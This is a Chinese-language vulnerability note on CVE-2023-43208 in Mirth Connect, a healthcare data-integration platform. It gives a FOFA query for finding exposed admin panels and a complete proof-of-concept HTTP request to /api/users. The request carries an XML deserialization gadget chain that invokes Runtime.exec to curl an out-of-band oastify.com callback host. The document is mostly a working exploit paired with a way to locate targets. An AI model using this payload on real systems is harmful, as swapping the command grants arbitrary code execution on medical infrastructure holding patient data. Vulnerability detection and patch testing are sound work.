**fofa**

```
title="Mirth Connect Administrator"
```

**一、漏洞简述**

Mirth Connect 是一个由医疗企业广为使用的开源数据一体化平台，允许不同系统以标准化的方式进行数据交换。用作消息传递系统中间件，该系统支持读取和写入数据库/FTP/SOAP/TCP/Local或网络共享文件/JMS/DICOM信道等。数据通过信道与至少两个端点(源和目标)交互（尽管单个源通道可以有多个目标通道），通过信道传递的数据可以使用SQL、Javascript和Java的组合进行过滤、映射、转换和路由。其接口/api/users存在CVE-2023-43208 反序列化漏洞，攻击者可通过该漏洞执行系统任意命令，从而控制该系统。

**二、漏洞检测poc**

```yaml
POST /api/users HTTP/1.1
Host: x.x.x.x
X-Requested-With: OpenAPI
Content-Type: application/xml
Content-Length: 2503

<sorted-set>
    <string>abcd</string>
        <dynamic-proxy>
            <interface>java.lang.Comparable</interface>
            <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
              <target class="org.apache.commons.collections4.functors.ChainedTransformer">
                <iTransformers>
                  <org.apache.commons.collections4.functors.ConstantTransformer>
                    <iConstant class="java-class">java.lang.Runtime</iConstant>
                  </org.apache.commons.collections4.functors.ConstantTransformer>
                  <org.apache.commons.collections4.functors.InvokerTransformer>
                    <iMethodName>getMethod</iMethodName>
                    <iParamTypes>
                      <java-class>java.lang.String</java-class>
                      <java-class>[Ljava.lang.Class;</java-class>
                    </iParamTypes>
                    <iArgs>
                      <string>getRuntime</string>
                      <java-class-array/>
                    </iArgs>
                  </org.apache.commons.collections4.functors.InvokerTransformer>
                  <org.apache.commons.collections4.functors.InvokerTransformer>
                    <iMethodName>invoke</iMethodName>
                    <iParamTypes>
                      <java-class>java.lang.Object</java-class>
                      <java-class>[Ljava.lang.Object;</java-class>
                    </iParamTypes>
                    <iArgs>
                      <null/>
                      <object-array/>
                    </iArgs>
                  </org.apache.commons.collections4.functors.InvokerTransformer>
                  <org.apache.commons.collections4.functors.InvokerTransformer>
                    <iMethodName>exec</iMethodName>
                    <iParamTypes>
                      <java-class>java.lang.String</java-class>
                    </iParamTypes>
                    <iArgs>
                      <string>curl http://test.dl24o625db2kkiihqxw5t78mpdv4jv7k.oastify.com</string>
                    </iArgs>
                  </org.apache.commons.collections4.functors.InvokerTransformer>
                </iTransformers>
              </target>
              <methodName>transform</methodName>
              <eventTypes>
                <string>compareTo</string>
              </eventTypes>
        </handler>
    </dynamic-proxy>
</sorted-set>
```

dnslog回显